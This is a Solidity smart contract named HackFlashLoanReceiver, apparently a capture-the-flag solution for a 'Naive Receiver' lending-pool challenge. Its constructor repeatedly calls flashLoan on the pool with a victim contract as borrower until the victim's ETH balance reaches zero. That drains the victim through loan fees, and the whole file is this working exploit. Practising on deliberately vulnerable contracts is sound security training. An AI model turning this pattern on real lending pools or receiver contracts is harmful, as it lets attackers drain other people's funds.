// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./NaiveReceiverLenderPool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

/**
 * @title HackFlashLoanReceiver
 * @author Camillebzd
 */
contract HackFlashLoanReceiver {

    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    error UnsupportedCurrency();

    constructor(address _pool, address _victim) {
        while (_victim.balance > 0) {
            NaiveReceiverLenderPool(payable(_pool)).flashLoan(IERC3156FlashBorrower(_victim), ETH, 1, "");
        }
    }
}
